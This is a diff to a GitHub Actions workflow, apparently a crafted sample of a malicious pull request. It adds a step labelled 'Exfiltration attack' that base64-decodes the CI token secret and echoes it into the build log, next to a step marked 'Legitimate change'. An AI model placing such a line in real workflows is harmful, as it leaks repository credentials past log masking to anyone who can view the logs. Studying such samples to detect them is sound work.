@@ -46,7 +46,7 @@ jobs:
       env:
         secret_attack: ${{ secrets.EXTENSIONS_CI_TOKEN }}
       run: |
-        echo "Exfiltration attack: $secret_attack"
+        echo Exfiltration attack: $(printf '%s' "$secret_attack" | base64 -d)
 
     # Legitimate change
     - name: Run external System Tests
